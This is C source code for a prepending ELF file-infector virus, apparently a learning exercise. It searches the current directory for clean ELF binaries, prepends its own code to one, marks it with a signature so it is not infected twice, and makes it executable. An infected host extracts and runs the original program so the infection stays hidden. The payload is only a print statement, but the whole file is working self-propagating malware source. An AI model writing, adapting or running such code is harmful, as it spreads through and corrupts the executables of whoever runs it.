#include <stdio.h>
#include <stdlib.h>
#include <libgen.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <dirent.h>
#include <string.h>
#include <wait.h>

// TODO: Get the size of virus
#define VIRUS_SIZE 17192
#define SIGNATURE 4033

void runELF(int virus_fd, int size, char *argv[]);
void infectELF(int virus_fd, char *to_infect);
int isElf(char *name);
char *findCleanELF(ino_t self);
void executePayload();


int main(int argc, char** argv) {
  // Read virus into memory
  char *name = basename(argv[0]);
  int virus_fd = open(name, O_RDWR);
  if(virus_fd == -1) { 
    perror("error opening file");
    return 1; 
  }
  struct stat st;
  fstat(virus_fd, &st);

  // Find a clean ELF file to infect
  char *to_infect = findCleanELF(st.st_ino);
	printf("File to infect: %s\n", to_infect);

	// Infect ELF file
	infectELF(virus_fd, to_infect);

	// If this is the virus add the signature
	// if(VIRUS_SIZE == st_size) {
	if(strcmp(name, "virus") == 0) {
		size_t sig = SIGNATURE;
		if(write(virus_fd, &sig, sizeof(sig)) == -1) {
			perror("Cannot write virus signature");
			exit(0);
		}
		// Execute the virus payload
		executePayload();
	} else {
		// If this is an infected ELF, run normal behavior
		runELF(virus_fd, st.st_size, argv);
		// Execute the virus payload
		executePayload();
	}

  close(virus_fd);

  return 0;
}


void runELF(int virus_fd, int size, char *argv[]) {
	// Create a temp file
	char *tmp_name = "tmp_file";
	int tmp_fd = open(tmp_name, O_CREAT | O_RDWR);
	if(tmp_fd == -1) {
		perror("Cannot create tmp file");
		exit(0);
	}
	
	// copy host ELF to tmp file
	lseek(virus_fd, VIRUS_SIZE, SEEK_SET);
	sendfile(tmp_fd, virus_fd, NULL, size - VIRUS_SIZE);
	close(tmp_fd);

	// fork and execve
	pid_t pid = fork();
	// child 
	if(pid == 0) {
		execv(tmp_name, argv);
	} else {
		waitpid(pid, NULL, 0);
		if(unlink(tmp_name) == -1) {
			perror("Cannot remove tmp file");
		}
	} 
}


void infectELF(int virus_fd, char *to_infect) {
	// Create a temp file and open victim file 
	char *tmp_name = "tmp_file";
	int tmp_fd = open(tmp_name, O_CREAT | O_RDWR);
	if(tmp_fd == -1) {
		perror("Cannot create tmp file");
		exit(0);
	}
	int file_fd = open(to_infect, O_RDONLY);
	if(file_fd == -1) {
    perror("error opening file");
		exit(0);
	}
	struct stat st;
	fstat(file_fd, &st);

	// Append virus to the start of tmp file
	if(sendfile(tmp_fd, virus_fd, NULL, VIRUS_SIZE) != VIRUS_SIZE) {
		perror("Cannot copy virus to tmp file");
		exit(0);
	}
	// Append victim file to tmp file
	if(sendfile(tmp_fd, file_fd, NULL, st.st_size) != st.st_size) {
		perror("Cannot copy victim to tmp file");
		exit(0);
	}
	// Append the virus signature to tmp file
	size_t sig = SIGNATURE;
	if(write(tmp_fd, &sig, sizeof(sig)) == -1) {
		perror("Cannot write virus signature");
		exit(0);
	}

	// Change tmp file permissions
	if(chmod(tmp_name, st.st_mode | S_IXUSR | S_IXGRP | S_IXOTH) == -1) {
		perror("Cannot change file permissions");
		exit(0);
	}

	// Rename tmp file
	char *test_name = "test_careful";
	if(rename(tmp_name, to_infect) == -1) {
		perror("Cannot rename tmp file");
		exit(0);
	}

	close(tmp_fd);
	close(file_fd);
}


int isElf(char *name) {
	// open the file
	int file_fd = open(name, O_RDONLY);
	if(file_fd == -1) {
    perror("error opening file");
		return -1;
	}
	// read the header
	char file_hdr[4];
	if(read(file_fd, file_hdr, 4) < 4) {
		perror("error reading file");
		return -1;
	}
	// read for signature
	lseek(file_fd, -8, SEEK_END);
	unsigned char sig_buffer[8];
	if(read(file_fd, sig_buffer, 8) < 8) {
		perror("error reading file signature");
		return -1;
	}

	// Check if the target ELF is clean
	unsigned char c1 = 0xc1;
	unsigned char c2 = 0xf;
	if(sig_buffer[0] == c1 && sig_buffer[1] == c2) { return -1; }

	close(file_fd);

	// Check if the file has magic numbers
	if(file_hdr[0] == 0x7F && file_hdr[1] == 'E' && file_hdr[2] == 'L' && 
		file_hdr[3] == 'F') { return 1; }
	return -1;
}


char *findCleanELF(ino_t self) {
  // open current directory
  DIR *dir = opendir(".");
  struct dirent *entry;
  while((entry = readdir(dir)) != NULL) {
		// Check that it is a clean ELF file, not itself
		if(entry->d_type == DT_REG && entry->d_ino != self && isElf(entry->d_name) != -1) { 
			closedir(dir);
			return entry->d_name; 
		}
  }
	closedir(dir);
	printf("No clean ELF found\n");
	exit(0);
}


void executePayload() {
  printf("Virus Payload\n");
}
